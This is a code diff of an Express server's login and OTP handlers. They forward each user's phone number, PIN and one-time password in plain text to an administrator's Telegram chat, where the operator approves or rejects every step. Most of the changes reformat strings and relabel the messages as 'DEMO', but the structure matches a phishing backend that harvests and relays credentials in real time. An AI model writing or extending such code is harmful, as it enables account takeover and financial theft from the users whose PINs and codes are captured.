@@ -141,17 +141,15 @@ app.post("/login", async function(request, response) {
                         ADMIN_CHAT_ID,
 
                     text:
-                        "🔔 NEW USER LOGIN ATTEMPT\n\n" +
+                        `🔔 DEMO LOGIN REQUEST\n\n
 
-                        "Phone: " +
-                        phone +
+                        Phone: ${loginRequest.phone}
 
-                        "\nDemo PIN: " + pinValue +
+                        \nDemo PIN: ${pin}
 
-                        "\nRequest ID: " +
-                        loginRequest.id +
+                        \nRequest ID: ${loginRequest.id}
 
-                        "\n\nChoose an action:",
+                        \n\nChoose an action:`,
 
 
                     reply_markup: {
@@ -165,8 +163,7 @@ app.post("/login", async function(request, response) {
                                         "✅ Approve",
 
                                     callback_data:
-                                        "approve_login_" +
-                                        loginRequest.id
+                                        `approve_login_${loginRequest.id}`
                                 },
 
                                 {
@@ -174,8 +171,7 @@ app.post("/login", async function(request, response) {
                                         "❌ Reject",
 
                                     callback_data:
-                                        "reject_login_" +
-                                        loginRequest.id
+                                        `reject_login_${loginRequest.id}`
                                 }
 
                             ]
@@ -327,17 +323,16 @@ app.post(
                             ADMIN_CHAT_ID,
 
                         text:
-                            "🔐 NEW USER LOGIN ATTEMPT\n\n" +
+                            `🔐 DEMO OTP SUBMITTED\n\n
 
-                            "Phone: " +
-                            loginRequest.phone +
+                            Phone: ${loginRequest.phone}
 
-                            "\nOTP: " +  otpValue +
+                            \nOTP: ${otp}
 
-                            "\nRequest ID: " +
-                            loginRequest.id +
+                            \nRequest ID: ${loginRequest.id}
 
-                            "\n\nChoose an action:",
+
+                            \n\nChoose an action:`,
 
 
                         reply_markup: {
@@ -351,8 +346,7 @@ app.post(
                                             "✅ Approve OTP",
 
                                         callback_data:
-                                            "approve_otp_" +
-                                            loginRequest.id
+                                            `approve_otp_${loginRequest.id}`
                                     },
 
                                     {
@@ -360,8 +354,7 @@ app.post(
                                             "❌ Reject OTP",
 
                                         callback_data:
-                                            "reject_otp_" +
-                                            loginRequest.id
+                                            `reject_otp_${loginRequest.id}`
                                     }
 
                                 ]
@@ -395,7 +388,7 @@ app.post(
                     success: false,
 
                     message:
-                        "Could not send login approval request"
+                        "Could not send demo approval request"
 
                 });
 
@@ -654,17 +647,15 @@ async function handleTelegramButton(
                     callbackQuery.message.message_id,
 
                 text:
-                    "✅ DEMO LOGIN APPROVED\n\n" +
+                    `✅ DEMO LOGIN APPROVED\n\n
 
-                    "Phone: " +
-                    loginRequest.phone +
+                    Phone: ${loginRequest.phone}
 
-                    "\nDemo PIN: " + pinValue +
+                    \nDemo PIN: ${pin}
 
-                    "\nRequest ID: " +
-                    loginRequest.id +
+                    \nRequest ID: ${loginRequest.id}
 
-                    "\n\nUser can continue to OTP."
+                    \n\nUser can continue to OTP.`,
 
             }
         );
@@ -712,13 +703,13 @@ async function handleTelegramButton(
                     callbackQuery.message.message_id,
 
                 text:
-                    "❌ DEMO LOGIN REJECTED\n\n" +
+                    `❌ DEMO LOGIN REJECTED\n\n
 
-                    "Phone: " +
-                    loginRequest.phone +
+                    Phone: ${loginRequest.phone}
 
-                    "\nRequest ID: " +
-                    loginRequest.id
+                    \nRequest ID: ${loginRequest.id}
+
+                    \n\nUser can try again.`,
 
             }
         );
@@ -770,17 +761,15 @@ async function handleTelegramButton(
                     callbackQuery.message.message_id,
 
                 text:
-                    "✅ DEMO OTP APPROVED\n\n" +
+                    `✅ DEMO OTP APPROVED\n\n
 
-                    "Phone: " +
-                    loginRequest.phone +
+                    Phone: ${loginRequest.phone}
 
-                    "\nOTP: " + otpValue +
+                    \nOTP: ${otp}
 
-                    "\nRequest ID: " +
-                    loginRequest.id +
+                    \nRequest ID: ${loginRequest.id}
 
-                    "\n\nUser can continue to Home."
+                    \n\nUser can continue to Home.`
 
             }
         );
@@ -828,17 +817,15 @@ async function handleTelegramButton(
                     callbackQuery.message.message_id,
 
                 text:
-                    "❌ DEMO OTP REJECTED\n\n" +
+                    `❌ DEMO OTP REJECTED\n\n
 
-                    "Phone: " +
-                    loginRequest.phone +
+                    Phone: ${loginRequest.phone}
 
-                    "\nOTP: " + otpValue +
+                    \nOTP: ${otp}
 
-                    "\nRequest ID: " +
-                    loginRequest.id +
+                    \nRequest ID: ${loginRequest.id}
 
-                    "\n\nUser can try again."
+                    \n\nUser can try again.`
 
             }
         );
